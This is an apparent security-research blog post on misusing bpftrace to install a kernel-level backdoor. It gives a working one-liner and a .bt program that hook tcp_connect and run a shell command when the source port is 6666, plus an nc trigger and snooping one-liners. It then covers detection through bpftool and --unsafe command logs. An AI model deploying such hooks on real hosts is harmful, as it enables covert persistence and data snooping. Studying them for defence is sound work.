---
title: "Offensive BPF - Misusing bpftrace to install a backdoor"
date: 2021-10-28T10:00:58-07:00
draft: true
tags: [
        "pentest", "red","research","bpf","blue"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Offensive BPF - Misusing bpftrace"
  description:  "Using eBPF in offensive security settings and mitigations"
  image: "https://embracethered.com/blog/images/2021/offensive-bpf.png"

---


![Offensive BPF](/blog/images/2021/offensive-bpf.png)

This post is part of a series about **Offensive BPF** that I'm working on, click the "bpf" tag to see all relevant posts.


## What is bpftrace 

`bpftrace` is a versatile tool that allows to experiment and create custom bpf programs without having to deal with too many low level things.

The [projects homepage](https://bpftrace.org/) calls it a "High-level tracing language for Linux systems", and it has a cute logo.

![Offensive BPF](/blog/images/2021/pony.png)

Its kind of a like a *bpf swiss army knife*.

### Installation

If the tool is not present follow the instructions [here](https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#ubuntu-packages). 


### Basic Examples

Here are the basic hello world examples you see when learning about `bpftrace`:

* Print the output of every `bash:readline` function call:
```
bpftrace -e 'uretprobe:bash:readline { printf("%s\n:, str(retvale)) }'
```

* Print filename of all opened files and process name:
```
bpftrace -e 't:syscalls:sys_enter_open { printf("%s %s\n", comm, str(args->filename)) }
```

As you can see a bpf backdoor can gain lots of access to information - imagine hooking passwords API calls or network trafficc with such one-liners. 

### Malicious deeds using system()

Hackers always look for simple ways to run shell commands, and that features is write built into `bpftrace` also:

```
bpftrace --unsafe -e 'BEGIN { printf("Hello Offensive BPF!\n");  system("ls"); }'
```

Notice that this requires the use of the `--unsafe` command line option.

## Backdoor example using bpftrace

`bpftrace` can be used to write simple (and not so simple) bpf programs.

To get a better understanding on what is possible with bpf from offsec point of view, let's look at basic example.

Assume an adversary gained priviliged access to a host, and now leverages `bpf` to install a `TCP connect` based backdoor. 

The goal is to run some arbitrary code (like creation of a new zombie or exfil of data) whenever the `source port` of the TCP connection has the number `6666`. 

Using `bpftrace` this can be compactly written as a one-liner:

```
sudo bpftrace --include net/sock.h --unsafe -e 'BEGIN { printf("Welcome to Offensive BPF!\n"); } kprobe:tcp_connect { if ( ((struct sock *) arg0)->__sk_common.skc_num == 6666) { printf("backdoor call");     system("whoami >> /proc/1/root/tmp/malware.txt"); }  }'
```

Let's look at the parameters:

1. bpftrace needs to run as `root`, or with proper `CAP_BPF` capabilityes (hence we use `sudo` here)
2. `--include`:  using this option we can ask to have kernel header files, etc. be included, so that we can access/reference the data structures
3. `--unsafe`: This is interest, as it enables to call `system` inside the bpf program, leading to arbitrary shell command execution!
4. `-e`: the actual `bpf` program

Indeed, this compiles and install the bpf program into the kernel. Pretty amazing.

You can also put the bpf program into a file and launch it. `bpftrace` programs typically have the `.bt` file extension by the way.

```
#include <net/sock.h> 

BEGIN 
{ 
    printf("Welcome to Offensive BPF!\n"); 
} 

kprobe:tcp_connect 
{ 
    if ( ((struct sock *) arg0)->__sk_common.skc_num == 6666) 
    { 
        printf("backdoor call");
        system("whoami >> /proc/1/root/tmp/malware.txt"); 
    }
}

END
{
    printf("Exiting. Bye.\n");
}

```



`sudo bpftrace --unsafe ./backdoor.bt`


Now let's look inside the program:

1. `BEGIN` and `END`: `bpftrace` allows to define code that is run before and after via BEGIN/END code blocks. In this case we just print a welcome message.
2. We attach the bpf program to the `kprobe:tcp_connect` kernel probe. So, whenever a TCP connection happens this program will run
3. We use the `struct sock` that we imported to gain access to the source port of the connection and see if it matches `6666`
4. Only if there is a match we run a `system` command - in this case just writing to the file at `/tmp/malware.txt` 


Afterwards try to connect to the backdoored host on any port that is open with a source port of `6666`. The bpf program will be exeucted and you can observe the `/tmp/malware.txt` file being created.

For testing, netcat (`nc`) allows you to specify the source port via the `-p` option, as follows:

```
nc -vv 192.168.0.12 8888 -p 6666
```
 
Afterwards you can check the server side for the existance of the `/tmp/malware.txt` file. :)

Pretty cool.

This was a simple example to help illustrate an offensive security scenario.

Imagine web server backdoor calls, or other sophisticated C2 channels that leverage this technologies.

## Red Team Simulation: Ransomware Excercises

Interestingly, it might also be quite helpful for red teams to simulate Ransomware Attacks. The bpf program could not really  data but by just having BPF overwrite user data structures on the fly and show users scrambled information.

This is something I want to build - so stay tuned.


## Detection

There are a set of detection ideas and for blue teams it's important to get all the right telemetry aroudn BPF syscalls to be able to get insights into what happens at the BPF layer. 

### Inspecting loaded bpf programs

Loaded bpf programs can be inspected via the `bpftool`.

For instance `bpftool prog` will show you the details and you can see the malicious backdoor one-liner we used shows up:

![BPF prog output](/blog/images/2021/bpfprog.png)

### --unsafe bpftrace usage 

The usage of system() call inside the bpftrace program is pretty unusual I'd say, so looking for command line logs that contain `bpftrace --unsafe` seems a good way to catch **dangerous** bpf programs also.


## Hooking the bpf system call

A nifty attacker might actually go ahead and hook the bpf system call itself to try and hide themselves - this is something we will explore in an upcoming offensive bpf post.

Happy hacking!

Twitter: [@wunderwuzzi23](https://twitter.com/wunderwuzzi23)

# Resources

* [BPF syscall](https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html)
* [BPF Documentation](https://www.kernel.org/doc/html/latest/bpf/index.html)
